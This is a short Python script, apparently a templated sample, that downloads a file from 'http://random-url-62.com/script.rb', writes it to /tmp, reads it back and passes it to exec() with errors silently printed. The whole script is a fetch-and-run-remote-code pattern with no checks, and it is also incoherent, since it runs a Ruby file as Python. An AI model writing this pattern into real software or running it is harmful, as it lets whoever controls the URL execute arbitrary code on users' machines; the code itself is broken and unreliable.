import requests
import os

def get_code(url):
    response = requests.get(url)
    return response.text

def save_code(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def load_code(file_path):
    with open(file_path, "r") as f:
        return f.read()

def run_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-62.com/script.rb"
    local_file = "/tmp/script62.rb"

    downloaded_code = get_code(random_url)
    save_code(local_file, downloaded_code)

    code_to_run = load_code(local_file)
    run_code(code_to_run)

main()
